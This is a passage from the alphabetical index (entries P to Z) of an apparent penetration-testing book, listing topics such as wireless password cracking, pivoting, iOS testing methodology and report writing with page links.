Paros Proxy [224](#c10.xhtml#page224)

passive scanning [49](#c03.xhtml#page49)

Password-Based Key Derivation Function (PBKDF2) [69](#c04.xhtml#page69)

penetration testing report

content [265](#c12.xhtml#page265), [266](#c12.xhtml#page266)

sample [266](#c12.xhtml#page266)\-[273](#c12.xhtml#page273)

phishing [31](#c02.xhtml#page31)

pivoting [169](#c09.xhtml#page169)

port forwarding [175](#c09.xhtml#page175)\-[177](#c09.xhtml#page177)

prevention, against threats

hosts, identifying [101](#c05.xhtml#page101)

network size, determining [101](#c05.xhtml#page101)

vulnerable hosts [102](#c05.xhtml#page102)

ProxyChains [186](#c09.xhtml#page186)\-[189](#c09.xhtml#page189)

PSK cracking [32](#c02.xhtml#page32)

R

Remote Authentication Dial-In User Service (RADIUS) [26](#c02.xhtml#page26)

reports, vulnerability assessment

generating [123](#c06.xhtml#page123)\-[125](#c06.xhtml#page125)

report writing [264](#c12.xhtml#page264)

finalization [265](#c12.xhtml#page265)

first draft, writing [265](#c12.xhtml#page265)

information collection [265](#c12.xhtml#page265)

penetration testing report content [265](#c12.xhtml#page265), [266](#c12.xhtml#page266)

planning [264](#c12.xhtml#page264), [265](#c12.xhtml#page265)

reviewing [265](#c12.xhtml#page265)

stages [264](#c12.xhtml#page264)

rogue access point [24](#c02.xhtml#page24)

routing [168](#c09.xhtml#page168), [169](#c09.xhtml#page169)

S

Scapy [13](#c01.xhtml#page13)

second pivot

access, gaining [180](#c09.xhtml#page180)

easy file share BoF [182](#c09.xhtml#page182)\-[185](#c09.xhtml#page185)

MS08-067 with bind TCP [180](#c09.xhtml#page180), [181](#c09.xhtml#page181)

semi-tethered Jailbreak [244](#c11.xhtml#page244)

semi-untethered Jailbreak [244](#c11.xhtml#page244)

sensitive data exposure, checking

sensitive data, in core data [256](#c11.xhtml#page256)

sensitive data, in couchbase lite [257](#c11.xhtml#page257)

sensitive data, in keychain [256](#c11.xhtml#page256)

sensitive data, in Plist [254](#c11.xhtml#page254)

sensitive data, in UserDefaults [255](#c11.xhtml#page255)

sensitive data, in YapDatabase [257](#c11.xhtml#page257)

shared key guessing [32](#c02.xhtml#page32)

sniffing [33](#c02.xhtml#page33)

Social Engineering Toolkit (SET) [30](#c02.xhtml#page30)

spoofing [130](#c07.xhtml#page130)

SSH brute-force

over pivoting [178](#c09.xhtml#page178), [179](#c09.xhtml#page179)

Supplicant Nounce (SNounce) [69](#c04.xhtml#page69)

T

targets

identifying [57](#c03.xhtml#page57)

testing methodology, iOS [245](#c11.xhtml#page245)

biometric (local) authentication, bypassing [252](#c11.xhtml#page252)\-[254](#c11.xhtml#page254)

IPA, extracting [245](#c11.xhtml#page245)

Jailbreak detection, bypassing [249](#c11.xhtml#page249)

Jailbreak detection, bypassing with Frida [250](#c11.xhtml#page250)

Jailbreak detection, bypassing with Objection [250](#c11.xhtml#page250), [251](#c11.xhtml#page251)

proxy, setting up [247](#c11.xhtml#page247)\-[249](#c11.xhtml#page249)

sensitive data exposure, checking in local [254](#c11.xhtml#page254)

SSL pinning, bypassing [251](#c11.xhtml#page251)

SSL pinning, bypassing with Objection [251](#c11.xhtml#page251), [252](#c11.xhtml#page252)

static analysis, running with MobSF [246](#c11.xhtml#page246), [247](#c11.xhtml#page247)

tethered Jailbreak [243](#c11.xhtml#page243)

U

unencrypted traffic

capturing [150](#c08.xhtml#page150)\-[159](#c08.xhtml#page159)

sniffing [131](#c07.xhtml#page131)\-[136](#c07.xhtml#page136)

untethered Jailbreak [243](#c11.xhtml#page243)

V

vulnerability assessment [103](#c06.xhtml#page103)

components [105](#c06.xhtml#page105), [106](#c06.xhtml#page106)

example [106](#c06.xhtml#page106)\-[108](#c06.xhtml#page108)

planning [105](#c06.xhtml#page105)

reports, generating [123](#c06.xhtml#page123)\-[125](#c06.xhtml#page125)

vulnerabilities, resolving [125](#c06.xhtml#page125)

vulnerability scanner

setting up [108](#c06.xhtml#page108)

vulnerable hosts

detecting [85](#c05.xhtml#page85)\-[101](#c05.xhtml#page101)

W

war driving [23](#c02.xhtml#page23)

WEP encryption [63](#c04.xhtml#page63)

WEP key cracking [27](#c02.xhtml#page27)

example [28](#c02.xhtml#page28)

Wi-Fi Protected Setup (WPS) [21](#c02.xhtml#page21)

wireless adaptor

installing [17](#c01.xhtml#page17), [18](#c01.xhtml#page18)

wireless attack

planning [62](#c04.xhtml#page62)

wireless honeypot [136](#c07.xhtml#page136)

wireless network discovery [41](#c03.xhtml#page41)

Nmap [41](#c03.xhtml#page41)

Zenmap [48](#c03.xhtml#page48)

wireless networks, sniffing [50](#c03.xhtml#page50)

wireless password cracking [63](#c04.xhtml#page63)

cracking process, speeding [75](#c04.xhtml#page75)\-[77](#c04.xhtml#page77)

mac address, spoofing [77](#c04.xhtml#page77)\-[79](#c04.xhtml#page79)

WEP encryption, cracking [64](#c04.xhtml#page64)\-[68](#c04.xhtml#page68)

WPA and WPA2 cracking, speeding [75](#c04.xhtml#page75)

WPA and WPA2 encryption [68](#c04.xhtml#page68)\-[70](#c04.xhtml#page70)

WPA-PSK and WPA2-PSK passphrase, cracking [70](#c04.xhtml#page70)\-[75](#c04.xhtml#page75)

wireless penetration testing

hardware requirements [3](#c01.xhtml#page3), [4](#c01.xhtml#page4)

software requirements [4](#c01.xhtml#page4), [5](#c01.xhtml#page5)

wireless penetration testing tools

Aircrack-ng [14](#c01.xhtml#page14)

Metasploit [15](#c01.xhtml#page15)

Nmap [13](#c01.xhtml#page13), [14](#c01.xhtml#page14)

Scapy [13](#c01.xhtml#page13)

Wireshark [12](#c01.xhtml#page12)

wireless scanning [49](#c03.xhtml#page49)

active scanning [49](#c03.xhtml#page49)

passive scanning [49](#c03.xhtml#page49)

working [50](#c03.xhtml#page50)

Wireshark [12](#c01.xhtml#page12), [51](#c03.xhtml#page51)

WPA and WPA2 encryption [68](#c04.xhtml#page68), [69](#c04.xhtml#page69)

WPS PIN [21](#c02.xhtml#page21)

Z

Zenmap [48](#c03.xhtml#page48)

zygote [196](#c10.xhtml#page196), [197](#c10.xhtml#page197)